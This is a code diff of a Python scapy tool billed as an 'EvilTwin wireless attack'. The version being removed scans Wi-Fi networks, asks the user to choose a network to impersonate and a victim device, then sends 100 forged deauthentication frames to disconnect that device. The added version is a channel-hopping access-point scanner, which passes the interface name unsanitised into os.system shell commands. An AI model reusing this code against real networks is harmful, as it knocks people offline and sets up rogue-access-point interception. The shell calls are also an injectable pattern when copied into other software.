@@ -1,3 +1,4 @@
+import argparse
 import os
 import sys
 
@@ -8,17 +9,10 @@ from threading import Thread
 import pandas
 import time
 import netifaces
-from scapy.layers.dot11 import Dot11, Dot11Elt, RadioTap, Dot11Deauth, Dot11Beacon
+from scapy.layers.dot11 import Dot11, Dot11Elt, RadioTap, Dot11Deauth, Dot11Beacon, Dot11ProbeResp
 
-# global variables
-networks = pandas.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel", "Crypto"])
-networks.set_index("BSSID", inplace=True)
-network_mac = dict()
-tic = time.perf_counter()
-ch = 1
-twin = ''
-devices = set()
-interface = ''
+client_AP = dict()
+AP = {}
 presentation = '''
 
   ______           _   _     _______              _         
@@ -31,41 +25,104 @@ presentation = '''
 '''
 
 
-def main():
-    global network_mac
-    global presentation
-    global interface
-    global twin
-    print(presentation)
-    progress2()
-    os.system('clear')
-    interface = get_interface()
-    monitor_mode(interface)
-    print("[+]Interface switched to monitor mode successfully")
-    time.sleep(1)
-    print("[+]Scanning for wireless networks")
-    # change interface wifi channel
-    channel_changer = Thread(target=change_channel)
-    channel_changer.daemon = True
-    channel_changer.start()
-    progbar = Thread(target=progressbar)
-    progbar.start()
-    sniff(prn=handler, iface=interface, timeout=60, monitor=True)
-    time.sleep(1)
-    twin = get_network().lower()
-    time.sleep(1)
-    print('[+]scanning for connected devices')
-    progbar = Thread(target=progressbar)
-    progbar.start()
-    sniff(prn=devices_handler, iface=interface, timeout=60, monitor=True)
-    time.sleep(1)
-    victim = get_device().lower()
-    # deauthentication packet to disconnect the victim device from the network
-    deauth = Dot11(type=0, subtype=12, addr1=victim, addr2=twin, addr3=twin)
-    # stack packet headers
-    deauth_pkt = RadioTap() / deauth / Dot11Deauth(reason=7)
-    # send the packet
-    sendp(deauth_pkt, inter=0.1, count=100, iface=interface, verbose=1)
+# progressbar
+def progress():
+    bar_cls = FillingCirclesBar
+
+    bar = bar_cls('loading')
+    for i in bar.iter(range(200, 400)):
+        sleep()
+
+
+def sleep():
+    t = 0.01
+    t += t * random.uniform(-0.1, 0.1)  # Add some variance
+    time.sleep(t)
+
+
+# parse argument variables
+def arg_parse():
+    parser = argparse.ArgumentParser(description='EvilTwin wireless attack.')
+    parser.add_argument('-i', '--interface', type=str, required=True,
+                        help='Name of the wireless interface you want to sniff packets on')
+    parser.add_argument('-c', '--channels', required=False, nargs=2, type=str,
+                        help='choose the channel range of which to sniff on')
+
+    args = vars(parser.parse_args())
+    if int(args['channels'][0]) not in range(1, 14) and int(args['channels'][1]) not in range(1, 14):
+        print("Invalid channels. Channels should be between 1 and 14")
+        sys.exit()
+
+    if args['interface'] not in netifaces.interfaces():
+        print('Interface not found.')
+        sys.exit()
+
+    if int(args['channels'][0]) > int(args['channels'][1]):
+        ch1 = args['channels'][1]
+        ch2 = args['channels'][0]
+    else:
+        ch1 = args['channels'][0]
+        ch2 = args['channels'][1]
+
+    return args['interface'], ch1, ch2
+
+
+# switch interface to monitor mode
+def monitor_mode(iface):
+    try:
+        os.system('sudo ifconfig ' + str(iface) + ' down')
+        os.system('sudo iwconfig ' + str(iface) + ' mode monitor')
+        os.system('sudo ifconfig ' + str(iface) + ' up')
+    except:
+        print("Make sure that this interface " + iface + " supports monitor mode")
+
+
+def add_ap(pkt):
+    global AP
+    if pkt.haslayer(Dot11Beacon):
+        ssid = pkt[Dot11Beacon].network_stats()['ssid']
+    else:
+        ssid = pkt[Dot11ProbeResp].network_stats()['ssid']
+
+    bssid = pkt[Dot11].addr3.lower()  # ap mac address
+    ap_channel = str(ord(pkt[Dot11Elt:3].info))
+    if bssid in AP:
+        return
+    else:
+        AP[bssid] = {}
+        AP[bssid]['channel'] = ap_channel
+        AP[bssid]['ssid'] = ssid
+
+
+def handler(pkt):
+    global client_AP
+    if pkt.haslayer(Dot11):
+        if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):  # AP
+            add_ap(pkt)
+
+
+def sniffer(iface, ch1='1', ch2='14'):
+    i = int(ch1)
+    j = int(ch2)
+    timeout = time.time() + 60  # a minute and 20 seconds from now
+    while True:
+        os.system("iwconfig " + iface + " channel " + str(i))  # switch channel
+        i = i % j + 1
+        sniff(prn=handler, iface=iface, timeout=1, monitor=True)
+        if time.time() > timeout:
+            break
+
+
+def output():
+    print('ACCESS POINTS:')
+    dash = '-' * 60
+    global AP
+    print(dash)
+    print('{:<20s}{:>10s}{:>20s}'.format('ESSID', 'CH', 'BSSID'))
+    print(dash)
+    for i in AP:
+        ssid = AP[i]['ssid']
+        print('{:<20s}{:>10s}{:^40s}'.format(ssid, AP[i]['channel'], i))
 
 
 # display a progress bar for aesthetics
@@ -78,112 +135,20 @@ def progressbar():
             time.sleep(0.6)
 
 
-# get a list of all the interfaces and return the interface chosen by the user
-def get_interface():
-    interface_names = netifaces.interfaces()  # get interfaces
-    interfaces_length = str(len(interface_names) - 1) + ""
-    for i in range(0, len(interface_names)):
-        print(i, ":", interface_names[i])
-    interface_index = input("\nchoose the WIFI interface you want to sniff packets on: ")
-    while '0' > str(interface_index) or str(interface_index) > interfaces_length:  # if the user chose wrong number
-        interface_index = input("\n\nERROR: please choose between numbers 0 - " + interfaces_length + ": ")
-    iface = interface_names[int(interface_index)]
-    return iface
-
-
-# switch interface to monitor mode
-def monitor_mode(iface):
-    os.system('sudo ifconfig ' + str(interface) + ' down')
-    os.system('sudo iwconfig ' + str(interface) + ' mode monitor')
-    os.system('sudo ifconfig ' + str(interface) + ' up')
-
-
-# change channels
-def change_channel():
-    global ch
-    os.system("iwconfig " + interface + " channel " + str(ch))
-    # switch channel from 1 to 14 each 0.5s
-    ch = ch % 14 + 1
-    time.sleep(0.5)
-
-
-# captures wireless networks and devices with packets sniffed by scapy
-def handler(pkt):
-    if pkt.haslayer(Dot11):
-
-        mac_frame = pkt.getlayer(Dot11)
-        # if pkt.type == 0 and pkt.subtype == 8:  # beacon which means its coming from a network
-        if pkt.haslayer(Dot11Beacon):
-            if mac_frame.addr2 not in network_mac:
-                ssid = pkt[Dot11Beacon].network_stats()['ssid']
-                network_mac[mac_frame.addr2] = ssid
-
-
-def devices_handler(pkt):
-    if pkt.haslayer(Dot11):
-
-        mac_frame = pkt.getlayer(Dot11)
-        ds = pkt.FCfield & 0x3  # frame control
-        to_ds = ds & 0x1 != 0  # to access point
-        from_ds = ds & 0x2 != 0  # from access point
-
-        if from_ds == 1 and to_ds == 0:  # transmitter is AP and destination is client
-            if str(mac_frame.addr2).lower() == twin and mac_frame.addr3 not in devices:
-                devices.add(mac_frame.addr3)
-
-        if from_ds == 0 and to_ds == 1:  # source address is client and transmitter is AP
-            if str(mac_frame.addr1).lower() == twin and mac_frame.addr2 != mac_frame.addr1 \
-                    and mac_frame.addr2 not in devices:
-                devices.add(mac_frame.addr2)
-
-        if from_ds == 0 and to_ds == 0:  # control frame or managment frame which means src is AP or vice versa
-            if str(mac_frame.addr1).lower() == twin and mac_frame.addr2 not in devices:
-                devices.add(mac_frame.addr2)
-                if str(mac_frame.addr2).lower() == twin and mac_frame.addr1 in devices:
-                    devices.add(mac_frame.addr1)
-
-
-# get a list of networks and return the mac of the network chosen by the user
-def get_network():
-    global network_mac
-    net_index = dict()
-    i = 0
-    print("Detected networks")
-    for network in network_mac:
-        print(i, "- " + str(network_mac[network]))
-        net_index[str(i)] = network
-        i = i + 1
-    k = input("Choose the network you want to impersonate: ")
-    return net_index[k]
-
-
-# list of devices connected to the chosen network and return the victim device chosen by the user
-def get_device():
-    global devices
-    device_mac = dict()
-    print("mac address of connected devices:")
-    i = 0
-    for device in devices:
-        print(i, "- " + str(device))
-        device_mac[str(i)] = device
-        i = i + 1
-    k = input("Choose the device you want to attack: ")
-    return device_mac[k]
-
-
-def sleep():
-    t = 0.01
-    t += t * random.uniform(-0.1, 0.1)  # Add some variance
-    time.sleep(t)
-
-
-def progress2():
-    bar_cls = FillingCirclesBar
-
-    bar = bar_cls('loading')
-    for i in bar.iter(range(200, 400)):
-        sleep()
-
-
-main()
-# progressbar()
+if __name__ == "__main__":
+    interface, from_ch, to_ch = arg_parse()
+    print(presentation)
+    progress()
+    os.system('clear')
+    time.sleep(1)
+    monitor_mode(interface)
+    print("[+]Interface switched to monitor mode")
+    time.sleep(1)
+    print("[+]Sniffing packets this will take a minute")
+    time.sleep(1)
+    progbar = Thread(target=progressbar)
+    progbar.start()
+    sniffer(interface, from_ch, to_ch)
+    time.sleep(2)
+    os.system('clear')
+    output()
